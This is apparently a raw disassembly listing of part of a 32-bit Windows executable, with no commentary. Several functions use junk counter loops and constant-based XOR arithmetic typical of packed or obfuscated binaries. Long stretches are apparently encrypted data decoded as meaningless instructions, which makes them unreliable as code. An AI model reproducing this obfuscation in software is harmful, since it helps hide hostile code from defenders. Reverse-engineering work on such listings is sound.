  4107e7:	jns    0x4107fb
  4107e9:	jnp    0x4107cf
  4107eb:	jge    0x4107b8
  4107ed:	ss jp  0x41083f
  4107f0:	xchg   ebx,eax
  4107f1:	rcl    DWORD PTR [esi-0x21],cl
  4107f4:	cmc    
  4107f5:	pop    es
  4107f6:	adc    eax,0x2eedfaae
  4107fb:	mov    edx,0x1a4960a0
  410800:	xchg   ebx,eax
  410801:	xchg   ecx,eax
  410802:	ins    BYTE PTR es:[edi],dx
  410803:	rol    DWORD PTR [ebx+0x6441a997],1
  410809:	mov    ecx,ecx
  41080b:	jle    0x4107a4
  41080d:	ret    0xce76
  410810:	cmc    
  410811:	cs pop esi
  410813:	ss push 0x31
  410816:	outs   dx,DWORD PTR ds:[esi]
  410817:	mov    esi,0x726bed42
  41081c:	add    dl,BYTE PTR [ecx-0x7f9022ff]
  410822:	jge    0x41086b
  410824:	scas   al,BYTE PTR es:[edi]
  410825:	jmp    0xcd52:0x30e75aaf
  41082c:	jne    0x410851
  41082e:	adc    al,0xbc
  410830:	and    al,0xc7
  410832:	sar    DWORD PTR [ebx],cl
  410834:	pop    ss
  410835:	mov    eax,ds:0x3ffe1643
  41083a:	pop    esi
  41083b:	fist   WORD PTR [eax+0x7c]
  41083e:	mov    eax,ds:0x8daa2256
  410843:	add    eax,0x5c0da666
  410848:	div    al
  41084a:	add    al,0xa0
  41084c:	pop    edx
  41084d:	mov    ecx,0x58d599a
  410852:	ret    
  410853:	pop    ss
  410854:	dec    ebp
  410855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410856:	lea    ecx,[edi-0x2e]
  410859:	pushf  
  41085a:	push   es
  41085b:	popf   
  41085c:	(bad)  
  41085d:	clc    
  41085e:	jl     0x4108b2
  410860:	add    eax,0x50d2007d
  410865:	aaa    
  410866:	int3   
  410867:	aam    0x87
  410869:	pop    ss
  41086a:	ret    
  41086b:	or     BYTE PTR [esi],bh
  41086d:	push   ds
  41086e:	inc    edi
  41086f:	dec    edx
  410870:	push   edx
  410871:	dec    ecx
  410872:	loope  0x41089c
  410874:	icebp  
  410875:	int3   
  410876:	push   eax
  410877:	jge    0x41084b
  410879:	jo     0x4108d1
  41087b:	(bad)  
  41087c:	call   0xca14f289
  410881:	stc    
  410882:	xor    ebp,eax
  410884:	xchg   BYTE PTR [eax],al
  410886:	sub    BYTE PTR [esi-0x31],0xba
  41088a:	loop   0x41089a
  41088c:	xor    BYTE PTR [ebp+0x39],ah
  41088f:	xchg   BYTE PTR [ebp-0x35],ah
  410892:	jno    0x41087c
  410894:	mov    esi,0x94c0e702
  410899:	mov    al,ds:0x4c897aa
  41089e:	cmp    BYTE PTR [eax+0x21],ch
  4108a1:	sahf   
  4108a2:	shr    DWORD PTR [esi+esi*1],1
  4108a5:	or     bl,BYTE PTR [edx+esi*4-0x2b]
  4108a9:	cmovge eax,DWORD PTR [edi-0x6f]
  4108ad:	mov    dh,0x3d
  4108af:	mov    dh,0x0
  4108b1:	mov    dl,0xb2
  4108b3:	mov    ds:0x6cbf013a,eax
  4108b8:	xchg   ebp,eax
  4108b9:	stc    
  4108ba:	ror    BYTE PTR es:[esi],0xee
  4108be:	add    eax,0x5da1f008
  4108c3:	pop    ebx
  4108c4:	cmp    bl,BYTE PTR [eax]
  4108c6:	push   ss
  4108c7:	std    
  4108c8:	mov    edi,0x7423e75b
  4108cd:	ret    0xf2d0
  4108d0:	cmp    al,0x2a
  4108d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108d3:	(bad)  
  4108d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108d5:	or     esp,ecx
  4108d7:	add    edi,eax
  4108d9:	sbb    eax,0x8e08d75c
  4108de:	and    al,0x8f
  4108e0:	push   ebx
  4108e1:	mov    edx,DWORD PTR [ecx+0x41]
  4108e4:	dec    esp
  4108e5:	in     eax,0x87
  4108e7:	(bad)  
  4108e8:	pop    ebp
  4108e9:	retw   0x8546
  4108ed:	mov    ebx,0x945d94c5
  4108f2:	mov    ebx,0x9ff62b78
  4108f7:	xor    ebp,DWORD PTR [ecx-0x3dc00414]
  4108fd:	mov    cl,0xc
  4108ff:	test   BYTE PTR [edi+0x28e3c1ab],ch
  410905:	aad    0x55
  410907:	call   0xe266f8ef
  41090c:	push   ebp
  41090d:	lock mov dh,0xa
  410911:	gs mov ebx,0x94bdf5e7
  410917:	fidiv  DWORD PTR [edi]
  410919:	xor    BYTE PTR [ecx-0x6d74354a],dh
  41091f:	mov    ch,0x1b
  410921:	cmp    bh,BYTE PTR [esi]
  410923:	gs inc ebp
  410925:	jns    0x4108c2
  410927:	retf   0x6f75
  41092a:	mov    edi,0x479b7c33
  41092f:	mov    ebp,0xecb0fe87
  410934:	adc    bl,BYTE PTR es:[esi-0x24]
  410938:	xchg   edx,eax
  410939:	mov    WORD PTR [edx-0x1334bc89],ss
  41093f:	dec    ebx
  410940:	leave  
  410941:	cld    
  410942:	push   ss
  410943:	pop    ebx
  410944:	xor    al,0x2b
  410946:	and    eax,0x671f6de1
  41094b:	retf   
  41094c:	popf   
  41094d:	inc    edx
  41094e:	jmp    esi
  410950:	retf   0x73ef
  410953:	outs   dx,BYTE PTR ds:[esi]
  410954:	jb     0x410978
  410956:	(bad)  
  410957:	imul   edx,DWORD PTR [edi-0x758fa47f],0x77
  41095e:	jl     0x4109b1
  410960:	cs (bad) 
  410963:	or     bh,BYTE PTR [edx+0x6f]
  410966:	inc    eax
  410967:	xchg   esp,eax
  410968:	cmp    DWORD PTR [bp+di],ebx
  41096b:	std    
  41096c:	inc    eax
  41096d:	das    
  41096e:	sub    DWORD PTR [ecx-0x3a],ecx
  410971:	pop    ebp
  410972:	mov    edi,0xf8b82820
  410977:	pop    esi
  410978:	push   0xbc62da9f
  41097d:	daa    
  41097e:	cld    
  41097f:	cmp    DWORD PTR [ecx+0x3fc39dd9],ebx
  410985:	mov    cl,0x6b
  410987:	pop    edi
  410988:	pop    es
  410989:	das    
  41098a:	sbb    al,0xc3
  41098c:	out    dx,eax
  41098d:	int    0x46
  41098f:	inc    edx
  410990:	addr16 inc al
  410993:	inc    ecx
  410994:	(bad)  
  410995:	xor    bl,BYTE PTR [ecx+0x4c]
  410998:	adc    al,0x14
  41099a:	push   esi
  41099b:	ss jne 0x4109fa
  41099e:	dec    esp
  41099f:	in     al,0xe0
  4109a1:	mov    BYTE PTR [ebx],cl
  4109a3:	je     0x410973
  4109a5:	dec    ecx
  4109a6:	ss push esi
  4109a8:	icebp  
  4109a9:	fsubr  QWORD PTR [esi+eax*1+0x1f]
  4109ad:	imul   esi,edx,0xc6fd334c
  4109b3:	pop    es
  4109b4:	aam    0xe4
  4109b6:	pop    ebp
  4109b7:	mov    ecx,0x4971cb55
  4109bc:	ja     0x4109f6
  4109be:	inc    ecx
  4109bf:	mov    eax,ds:0x62f6e8e7
  4109c4:	lea    ebp,[edi+0x7e5a675f]
  4109ca:	adc    eax,0xbc787c92
  4109cf:	ret    0xf331
  4109d2:	sub    BYTE PTR [esi-0x1e],bl
  4109d5:	add    ebp,edi
  4109d7:	push   cs
  4109d8:	cmp    cx,dx
  4109db:	jne    0x40e62e
  4109e1:	mov    ecx,DWORD PTR ds:0x424435
  4109e7:	mov    ecx,DWORD PTR [ecx+0x198]
  4109ed:	mov    DWORD PTR [ecx],eax
  4109ef:	jmp    0x410a15
  4109f4:	mov    ecx,DWORD PTR [ebp+0x18]
  4109f7:	cmp    ecx,0xf89c85b2
  4109fd:	jne    0x410a15
  410a03:	push   eax
  410a04:	push   DWORD PTR [ebp+0x14]
  410a07:	push   DWORD PTR [ebp+0x10]
  410a0a:	push   DWORD PTR [ebp+0xc]
  410a0d:	push   DWORD PTR [ebp+0x8]
  410a10:	call   0x40772b
  410a15:	pop    edi
  410a16:	pop    esi
  410a17:	leave  
  410a18:	ret    0x14
  410a1b:	push   ebp
  410a1c:	mov    ebp,esp
  410a1e:	push   ecx
  410a1f:	and    DWORD PTR ds:0x422004,0x0
  410a29:	jmp    0x410a3b
  410a2e:	mov    edx,DWORD PTR ds:0x422004
  410a34:	inc    edx
  410a35:	mov    DWORD PTR ds:0x422004,edx
  410a3b:	cmp    DWORD PTR ds:0x422004,0x13
  410a42:	jae    0x410a8f
  410a48:	cmp    DWORD PTR ds:0x422004,0xb
  410a4f:	jne    0x410a68
  410a55:	push   DWORD PTR [ebp-0xc]
  410a58:	push   0x42201c
  410a5d:	push   0x5e67
  410a62:	call   DWORD PTR ds:0x4247d9
  410a68:	cmp    DWORD PTR ds:0x422004,0xa
  410a6f:	jne    0x410a84
  410a75:	xor    edx,edx
  410a77:	add    edx,DWORD PTR ds:0x422004
  410a7d:	inc    edx
  410a7e:	mov    DWORD PTR ds:0x422004,edx
  410a84:	jmp    0x410a2e
  410a89:	xor    edx,DWORD PTR ds:0x420ef4
  410a8f:	push   ecx
  410a90:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  410a97:	xor    eax,eax
  410a99:	xor    eax,DWORD PTR ds:0x420f9c
  410a9f:	adc    DWORD PTR ds:0x420fb4,eax
  410aa5:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  410aac:	neg    eax
  410aae:	mov    eax,DWORD PTR [ebp-0x4]
  410ab1:	mov    ecx,DWORD PTR ds:0x420fa0
  410ab7:	adc    DWORD PTR ds:0x420e7e,ecx
  410abd:	push   esi
  410abe:	mov    esi,DWORD PTR [ebp-0x8]
  410ac1:	mov    edx,DWORD PTR ds:0x420f44
  410ac7:	mov    ecx,DWORD PTR ds:0x423010
  410acd:	sub    ecx,edx
  410acf:	xor    edx,DWORD PTR [edx+ecx*1]
  410ad2:	mov    edx,0x7510896
  410ad7:	mov    DWORD PTR ds:0x420fa4,0x1c
  410ae1:	cmp    DWORD PTR ds:0x420fa4,0x0
  410ae8:	je     0x410b1f
  410aee:	cmp    DWORD PTR ds:0x420fa4,0x1e
  410af5:	jne    0x410b0b
  410afb:	push   0x424143
  410b00:	push   0x4240f3
  410b05:	call   DWORD PTR ds:0x4247dd
  410b0b:	xor    ecx,ecx
  410b0d:	or     ecx,DWORD PTR ds:0x420fa4
  410b13:	dec    ecx
  410b14:	mov    DWORD PTR ds:0x420fa4,ecx
  410b1a:	jmp    0x410ae1
  410b1f:	xor    eax,edx
  410b21:	xor    esi,edx
  410b23:	mov    ecx,0x3272dd
  410b28:	add    esi,ecx
  410b2a:	add    eax,ecx
  410b2c:	imul   eax,esi
  410b2f:	mov    esi,DWORD PTR [ebp+0xc]
  410b32:	cmp    esi,eax
  410b34:	jne    0x410b50
  410b3a:	mov    eax,DWORD PTR [ebp-0x4]
  410b3d:	mov    esi,DWORD PTR [ebp-0x8]
  410b40:	xor    eax,edx
  410b42:	xor    esi,edx
  410b44:	add    eax,ecx
  410b46:	add    esi,ecx
  410b48:	imul   eax,esi
  410b4b:	jmp    0x410b8b
  410b50:	mov    eax,DWORD PTR [ebp+0xc]
  410b53:	mov    eax,DWORD PTR [eax+0x78]
  410b56:	mov    DWORD PTR [ebp+0xc],eax
  410b59:	mov    eax,DWORD PTR [ebp-0x4]
  410b5c:	mov    esi,DWORD PTR [ebp-0x8]
  410b5f:	xor    eax,edx
  410b61:	xor    esi,edx
  410b63:	add    eax,ecx
  410b65:	add    esi,ecx
  410b67:	imul   eax,esi
  410b6a:	mov    esi,DWORD PTR [ebp+0xc]
  410b6d:	cmp    esi,eax
  410b6f:	mov    eax,DWORD PTR [ebp-0x4]
  410b72:	je     0x410b3d
  410b78:	xor    eax,edx
  410b7a:	add    eax,ecx
  410b7c:	mov    ecx,DWORD PTR [ebp+0xc]
  410b7f:	imul   eax,ecx
  410b82:	add    eax,DWORD PTR [ebp+0x8]
  410b85:	mov    DWORD PTR [ebp+0xc],eax
  410b88:	mov    eax,DWORD PTR [ebp+0xc]
  410b8b:	pop    esi
  410b8c:	leave  
  410b8d:	ret    0x8
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	push   ecx
  410b94:	and    DWORD PTR ds:0x420ef0,0x0
  410b9e:	mov    eax,ds:0x420ef0
  410ba3:	inc    eax
  410ba4:	mov    ds:0x420ef0,eax
  410ba9:	cmp    DWORD PTR ds:0x420ef0,0x6
  410bb0:	jne    0x410bc7
  410bb6:	push   0x613e
  410bbb:	push   DWORD PTR [ebp-0xc]
  410bbe:	push   DWORD PTR [ebp-0x10]
  410bc1:	call   DWORD PTR ds:0x4247e1
  410bc7:	cmp    DWORD PTR ds:0x420ef0,0x5
  410bce:	jne    0x410be2
  410bd4:	xor    eax,eax
  410bd6:	or     eax,DWORD PTR ds:0x420ef0
  410bdc:	inc    eax
  410bdd:	mov    ds:0x420ef0,eax
  410be2:	cmp    DWORD PTR ds:0x420ef0,0x1b
  410be9:	jb     0x410b9e
  410bef:	or     DWORD PTR ds:0x420e8e,0x6d67
  410bf9:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  410c00:	mov    eax,DWORD PTR [ebp-0x4]
  410c03:	mov    ecx,DWORD PTR ds:0x420f08
  410c09:	sbb    ecx,DWORD PTR ds:0x420ef4
  410c0f:	mov    DWORD PTR ds:0x420f08,ecx
  410c15:	mov    edx,DWORD PTR [ebp+0x10]
  410c18:	mov    ecx,DWORD PTR ds:0x42201c
  410c1e:	sub    DWORD PTR ds:0x42200c,ecx
  410c24:	mov    ecx,0x7510896
  410c29:	xor    eax,ecx
  410c2b:	add    eax,0x3272dd
  410c30:	mov    DWORD PTR [edx],eax
  410c32:	mov    eax,DWORD PTR [ebp+0xc]
  410c35:	xor    eax,ecx
  410c37:	push   esi
  410c38:	mov    esi,DWORD PTR [ebp+0x10]
  410c3b:	mov    edx,0x3272dd
  410c40:	add    eax,edx
  410c42:	mov    DWORD PTR [esi+0x4],eax
  410c45:	mov    eax,DWORD PTR [ebp+0x14]
  410c48:	mov    esi,DWORD PTR [ebp+0x10]
  410c4b:	mov    DWORD PTR [esi+0x8],eax
  410c4e:	mov    eax,DWORD PTR [ebp+0x18]
  410c51:	mov    esi,DWORD PTR [ebp+0x10]
  410c54:	mov    DWORD PTR [esi+0xc],eax
  410c57:	mov    eax,DWORD PTR [ebp+0x1c]
  410c5a:	mov    esi,DWORD PTR [ebp+0x10]
  410c5d:	mov    DWORD PTR [esi+0x10],eax
  410c60:	mov    eax,DWORD PTR [ebp+0x8]
  410c63:	xor    eax,ecx
  410c65:	add    eax,edx
  410c67:	pop    esi
  410c68:	leave  
  410c69:	ret    0x18
  410c6c:	push   ebp
  410c6d:	mov    ebp,esp
  410c6f:	sub    esp,0xa4
  410c75:	or     eax,eax
  410c77:	mov    ecx,DWORD PTR [ebp+0x8]
  410c7a:	mov    eax,0x8a89
  410c7f:	xor    ax,WORD PTR [ecx+0x20]
  410c83:	mov    ecx,0x3b4c
  410c88:	and    DWORD PTR ds:0x420fac,0x1c5
  410c92:	add    ax,cx
  410c95:	movzx  eax,ax
  410c98:	and    DWORD PTR ds:0x420e8a,0x0
  410ca2:	mov    ecx,DWORD PTR ds:0x420e8a
  410ca8:	inc    ecx
  410ca9:	mov    DWORD PTR ds:0x420e8a,ecx
  410caf:	cmp    DWORD PTR ds:0x420e8a,0x9
  410cb6:	jne    0x410ccd
  410cbc:	push   DWORD PTR [ebp-0x20]
  410cbf:	push   0x420f08
  410cc4:	push   DWORD PTR [ebp-0x10]
  410cc7:	call   DWORD PTR ds:0x4247e5
  410ccd:	cmp    DWORD PTR ds:0x420e8a,0x8
  410cd4:	jne    0x410ce9
  410cda:	xor    ecx,ecx
  410cdc:	add    ecx,DWORD PTR ds:0x420e8a
  410ce2:	inc    ecx
  410ce3:	mov    DWORD PTR ds:0x420e8a,ecx
  410ce9:	cmp    DWORD PTR ds:0x420e8a,0x16
  410cf0:	jb     0x410ca2
  410cf6:	mov    DWORD PTR [ebp-0x18],eax
  410cf9:	mov    BYTE PTR [ebp-0x1],0x7d
  410cfd:	sub    ecx,DWORD PTR ds:0x420e9a
  410d03:	lea    eax,[ebp-0x1]
  410d06:	and    DWORD PTR ds:0x420e82,0x0
  410d10:	xor    ecx,ecx
  410d12:	or     ecx,DWORD PTR ds:0x420e82
  410d18:	inc    ecx
  410d19:	mov    DWORD PTR ds:0x420e82,ecx
  410d1f:	cmp    DWORD PTR ds:0x420e82,0x14
  410d26:	jne    0x410d32
  410d2c:	call   DWORD PTR ds:0x4247f1
  410d32:	cmp    DWORD PTR ds:0x420e82,0x11
  410d39:	jb     0x410d10
  410d3f:	mov    DWORD PTR [ebp-0x10],eax
  410d42:	or     DWORD PTR ds:0x420fa8,edx
  410d48:	mov    al,BYTE PTR [ebp-0x1]
  410d4b:	sub    DWORD PTR ds:0x422008,ebx
  410d51:	mov    ecx,DWORD PTR [ebp-0x10]
  410d54:	xor    al,0x71
  410d56:	sbb    DWORD PTR ds:0x420fb0,0x420f04
  410d60:	sub    al,0xb
  410d62:	add    DWORD PTR ds:0x420f00,0x7fa5
  410d6c:	mov    BYTE PTR [ecx],al
  410d6e:	sbb    ecx,0xfb
  410d74:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  410d7b:	neg    eax
  410d7d:	push   ebx
  410d7e:	and    DWORD PTR ds:0x420f68,ebx
  410d84:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  410d8b:	not    ecx
  410d8d:	mov    ecx,DWORD PTR [ebp-0x14]
  410d90:	and    DWORD PTR ds:0x420ef8,0x0
  410d9a:	mov    eax,ds:0x420ef8
  410d9f:	inc    eax
  410da0:	mov    ds:0x420ef8,eax
  410da5:	cmp    DWORD PTR ds:0x420ef8,0xd
  410dac:	jne    0x410db8
  410db2:	call   DWORD PTR ds:0x4247f5
  410db8:	cmp    DWORD PTR ds:0x420ef8,0xc
  410dbf:	jne    0x410dd0
  410dc5:	mov    eax,ds:0x420ef8
  410dca:	inc    eax
  410dcb:	mov    ds:0x420ef8,eax
  410dd0:	cmp    DWORD PTR ds:0x420ef8,0x1f
  410dd7:	jb     0x410d9a
  410ddd:	or     DWORD PTR ds:0x420fa4,edx
  410de3:	push   esi
  410de4:	mov    eax,0x7510896
  410de9:	xor    ecx,eax
  410deb:	and    DWORD PTR ds:0x420fb0,0x0
  410df5:	jmp    0x410e07
  410dfa:	mov    esi,DWORD PTR ds:0x420fb0
  410e00:	inc    esi
  410e01:	mov    DWORD PTR ds:0x420fb0,esi
  410e07:	cmp    DWORD PTR ds:0x420fb0,0x16
  410e0e:	jae    0x410e4f
  410e14:	cmp    DWORD PTR ds:0x420fb0,0x26
  410e1b:	jne    0x410e44
  410e21:	push   0x2107
  410e26:	push   DWORD PTR [ebp-0xc]
  410e29:	push   0x420ea2
  410e2e:	push   DWORD PTR [ebp-0xc]
  410e31:	push   0x1296
  410e36:	push   0x8533
  410e3b:	push   DWORD PTR [ebp-0x24]
  410e3e:	call   DWORD PTR ds:0x4247f9
  410e44:	jmp    0x410dfa
  410e49:	xor    esi,0x6f84
  410e4f:	mov    esi,0x3272dd
  410e54:	push   edi
  410e55:	adc    DWORD PTR ds:0x422000,0x420fb0
  410e5f:	add    ecx,esi
  410e61:	jmp    0x410e7b
  410e66:	mov    DWORD PTR ds:0x422018,0x61e6
  410e70:	mov    dl,BYTE PTR [ebp-0x1]
  410e73:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  410e7a:	inc    ecx
  410e7b:	mov    DWORD PTR ds:0x420fa8,0x4793
  410e85:	cmp    ecx,0x40
  410e88:	mov    DWORD PTR ds:0x420f98,0x2ddc
  410e92:	jb     0x410e66
  410e98:	mov    edx,DWORD PTR ds:0x420e7a
  410e9e:	adc    DWORD PTR ds:0x420f58,edx
  410ea4:	mov    edx,DWORD PTR [ebp-0x14]
  410ea7:	add    DWORD PTR ds:0x420f9c,0x420e8e
  410eb1:	xor    edx,eax
  410eb3:	or     DWORD PTR ds:0x420e9e,0x6c51
  410ebd:	add    edx,esi
  410ebf:	mov    DWORD PTR ds:0x420f98,0x212f
  410ec9:	jmp    0x410f67
  410ece:	mov    ecx,DWORD PTR ds:0x420f58
  410ed4:	adc    ecx,DWORD PTR ds:0x420ef8
  410eda:	mov    DWORD PTR ds:0x420f58,ecx
  410ee0:	mov    edi,DWORD PTR [ebp+0x8]
  410ee3:	neg    ecx
  410ee5:	mov    ecx,0x8a89
  410eea:	mov    DWORD PTR ds:0x422010,0x1e03
  410ef4:	xor    cx,WORD PTR [edi+edx*4+0x2]
  410ef9:	xor    DWORD PTR ds:0x420efc,0x6f5f
  410f03:	mov    edi,0x3b4c
  410f08:	sbb    DWORD PTR ds:0x420f9c,0x63db
  410f12:	add    cx,di
  410f15:	add    DWORD PTR ds:0x42201c,0x420fa0
  410f1f:	movzx  ecx,cx
  410f22:	sub    DWORD PTR ds:0x420f08,0x420f5c
  410f2c:	mov    DWORD PTR [ebp-0x10],ecx
  410f2f:	mov    ecx,DWORD PTR [ebp+0x8]
  410f32:	add    DWORD PTR ds:0x422004,0x422010
  410f3c:	movzx  ecx,WORD PTR [ecx+edx*4]
  410f40:	xor    ecx,0x8a89
  410f46:	and    DWORD PTR ds:0x420ef8,0x48dd
  410f50:	add    ecx,edi
  410f52:	mov    edi,DWORD PTR [ebp-0x10]
  410f55:	mov    DWORD PTR ds:0x420fb4,0x2f78
  410f5f:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  410f66:	inc    edx
  410f67:	mov    DWORD PTR ds:0x420e7a,edx
  410f6d:	mov    ecx,DWORD PTR [ebp-0x18]
  410f70:	mov    DWORD PTR ds:0x420f08,0x1ffa
  410f7a:	cmp    edx,ecx
  410f7c:	mov    DWORD PTR ds:0x420efc,0x1e95
  410f86:	jne    0x410ece
  410f8c:	mov    ecx,DWORD PTR [ebp-0x14]
  410f8f:	add    edx,0x1ead
  410f95:	mov    edx,DWORD PTR [ebp+0x10]
  410f98:	sbb    DWORD PTR ds:0x422008,0x2f5c
  410fa2:	xor    ecx,eax
  410fa4:	and    DWORD PTR ds:0x422018,0x2dc0
  410fae:	add    ecx,esi
  410fb0:	jmp    0x41333d
  410fb5:	lods   eax,DWORD PTR ds:[esi]
  410fb6:	mov    ecx,0xd4095449
  410fbb:	jae    0x411038
  410fbd:	sbb    BYTE PTR [ebx+0x5eb5629f],0x10
  410fc4:	shr    DWORD PTR [esi],cl
  410fc6:	scas   al,BYTE PTR es:[edi]
  410fc7:	jp     0x411043
  410fc9:	or     bl,BYTE PTR [edi+0x7a]
  410fcc:	jp     0x41101c
  410fce:	aam    0x22
  410fd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fd1:	fiadd  DWORD PTR [esp-0x5a0aa451]
  410fd8:	fistp  QWORD PTR [ebp-0x78eb9730]
  410fde:	je     0x411026
  410fe0:	sti    
  410fe1:	mov    edi,0x9889e237
  410fe6:	xchg   esp,eax
  410fe7:	adc    DWORD PTR [esi-0x31],edx
  410fea:	fs scas al,BYTE PTR es:[edi]
  410fec:	sbb    al,0xb9
  410fee:	push   ebx
  410fef:	inc    ecx
  410ff0:	lock push 0x12875da8
  410ff6:	jo     0x41105f
  410ff8:	es adc ah,0x43
  410ffc:	sahf   
  410ffd:	(bad)  
  410ffe:	imul   esp,DWORD PTR [ebp-0x3eb77cd5],0xfffffff6
  411005:	addr16 aad 0x20
  411008:	and    dh,BYTE PTR [eax-0x67]
  41100b:	retf   
  41100c:	lods   eax,DWORD PTR ds:[esi]
  41100d:	sbb    al,0xc8
  41100f:	xchg   edi,eax
  411010:	push   es
  411011:	and    bl,dh
  411013:	lods   al,BYTE PTR ds:[esi]
  411014:	imul   esi,DWORD PTR [eax-0xeef3aea],0x2e
  41101b:	pop    ss
  41101c:	add    ah,BYTE PTR [ebx]
  41101e:	loopne 0x411007
  411020:	mov    ebp,0x69eb70da
  411025:	or     eax,0x53109d2
  41102a:	cmp    DWORD PTR [edi+0x69],ebp
  41102d:	jl     0x411072
  41102f:	daa    
  411030:	pop    esp
  411031:	mov    cl,0x3f
  411033:	in     al,dx
  411034:	inc    edi
  411035:	jecxz  0x41104c
  411037:	pop    edi
  411038:	fisttp DWORD PTR [ecx+0x352f0ccd]
  41103e:	(bad)  
  41103f:	retf   0x22de
  411042:	icebp  
  411043:	(bad)  
  411044:	dec    esi
  411045:	clc    
  411046:	xor    DWORD PTR [esi-0x6a],ebx
  411049:	bound  ecx,QWORD PTR ss:[ecx-0x65]
  41104d:	sub    al,0x10
  41104f:	jnp    0x411093
  411051:	xchg   edi,eax
  411052:	mov    edx,es
  411054:	mov    ch,0xf0
  411056:	dec    edx
  411057:	mov    cl,0x66
  411059:	out    0xeb,al
  41105b:	mov    bh,0x8a
  41105d:	stc    
  41105e:	sub    ecx,eax
  411060:	(bad)  
  411061:	daa    
  411062:	or     edx,edx
  411064:	and    al,0xe4
  411066:	inc    esi
  411067:	mov    dh,0x9b
  411069:	cmp    ah,bl
  41106b:	(bad)  
  41106c:	cwde   
  41106d:	(bad)  
  41106e:	nop
  41106f:	imul   ebx,eax,0xffffffbf
  411072:	or     bl,cl
  411074:	push   cs
  411075:	div    dh
  411077:	pop    esi
  411078:	cdq    
  411079:	fucomi st,st(5)
  41107b:	jno    0x41106f
  41107d:	ins    BYTE PTR es:[edi],dx
  41107e:	sbb    bh,bl
  411080:	arpl   bx,sp
  411082:	iret   
  411083:	mov    eax,ds:0x10ea8023
  411088:	popf   
  411089:	outs   dx,DWORD PTR ds:[esi]
  41108a:	scas   eax,DWORD PTR es:[edi]
  41108b:	dec    ebp
  41108c:	push   esp
  41108d:	xchg   ebx,eax
  41108e:	stos   BYTE PTR es:[edi],al
  41108f:	mov    eax,0xf8ae0a16
  411094:	data16 clc 
  411096:	ds pop esi
  411098:	xchg   DWORD PTR [eax],ecx
  41109a:	lods   al,BYTE PTR ds:[esi]
  41109b:	mov    ch,0x13
  41109d:	and    eax,0x1601241
  4110a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110a3:	rcr    BYTE PTR [esp+eax*4+0x2a],cl
  4110a7:	ja     0x4110d7
  4110a9:	sbb    edx,esi
  4110ab:	test   BYTE PTR [edi+0x2a],bl
  4110ae:	xchg   ecx,eax
  4110af:	cwde   
  4110b0:	jle    0x41105a
  4110b2:	cmc    
  4110b3:	or     dh,bh
  4110b5:	jno    0x4110e4
  4110b7:	idiv   BYTE PTR [eax-0x6219f0b7]
  4110bd:	arpl   WORD PTR [esi+0xd833ffa],bp
  4110c3:	sub    al,0xce
  4110c5:	push   esi
  4110c6:	loope  0x411084
  4110c8:	push   esi
  4110c9:	push   ds
  4110ca:	push   ss
  4110cb:	sbb    al,0xdd
  4110cd:	jb     0x411058
  4110cf:	jg     0x4110ce
  4110d1:	mov    BYTE PTR [esi-0x7febe638],bl
  4110d7:	sar    DWORD PTR [edx-0xb78b126],0x47
  4110de:	inc    edi
  4110df:	mov    ebp,0x548f1c07
  4110e4:	pop    esi
  4110e5:	fistp  WORD PTR [eax]
  4110e7:	sti    
  4110e8:	mov    es,edx
  4110ea:	adc    dh,BYTE PTR [ebp-0x66]
  4110ed:	in     al,0x4e
  4110ef:	mov    dl,0x2d
  4110f1:	les    edx,FWORD PTR [ebx]
  4110f3:	je     0x4110d2
  4110f5:	cmp    DWORD PTR [eax+esi*8+0x5a92af69],edx
  4110fc:	pop    ebx
  4110fd:	inc    esp
  4110fe:	push   edx
  4110ff:	adc    al,0x2f
  411101:	out    0x8f,eax
  411103:	cli    
  411104:	es push ecx
  411106:	popf   
  411107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411108:	and    al,0x5a
  41110a:	cmp    BYTE PTR [edx-0x3ca5468],dl
  411110:	push   0xffffff85
  411112:	push   ss
  411113:	inc    ebx
  411114:	jp     0x41118a
  411116:	jns    0x411101
  411118:	ss ins BYTE PTR es:[edi],dx
  41111a:	xor    cl,al
  41111c:	inc    esi
  41111d:	push   ebp
  41111e:	loope  0x411156
  411120:	jne    0x4110e8
  411122:	lods   al,BYTE PTR ds:[esi]
  411123:	pushf  
  411124:	or     DWORD PTR [ebx-0x68],ebp
  411127:	fisubr WORD PTR [ebp+0x6616fdbd]
  41112d:	out    dx,eax
  41112e:	data16 shl BYTE PTR [edx],1
  411131:	daa    
  411132:	mov    dl,0x2
  411134:	sub    ebx,DWORD PTR [ecx+0x8c3cf9a]
  41113a:	xchg   ecx,eax
  41113b:	mov    al,0x5
  41113d:	push   0x9b6ba38e
  411142:	or     eax,0x2bbf972a
  411147:	fidivr WORD PTR [esi-0x471eb4f4]
  41114d:	sub    eax,0xdda1e942
  411152:	sbb    al,0x84
  411154:	aas    
  411155:	push   esp
  411156:	sbb    DWORD PTR [ecx-0x10cb42e2],esi
  41115c:	rcr    DWORD PTR [ebx-0x51],1
  41115f:	in     eax,0x60
  411161:	ret    0xcdcd
  411164:	and    edx,DWORD PTR [edi+0xa]
  411167:	aas    
  411168:	call   0xcd83:0xcffdc0a5
  41116f:	inc    esi
  411170:	cld    
  411171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411172:	popf   
  411173:	aad    0xc8
  411175:	idiv   BYTE PTR [edx]
  411177:	mov    ch,0x20
  411179:	sbb    eax,0xcc2ef2a1
  41117e:	loope  0x4111b7
  411180:	inc    ecx
  411181:	femms  
  411183:	pop    ebx
  411184:	std    
  411185:	fmul   QWORD PTR [ebx-0x2f9f40c2]
  41118b:	xor    edx,esi
  41118d:	es sbb al,0x19
  411190:	aam    0x64
  411192:	fcomip st,st(3)
  411194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411195:	stos   DWORD PTR es:[edi],eax
  411196:	sbb    BYTE PTR [edx],al
  411198:	imul   esi,DWORD PTR [edi-0xf],0x43749a7b
  41119f:	popf   
  4111a0:	inc    edi
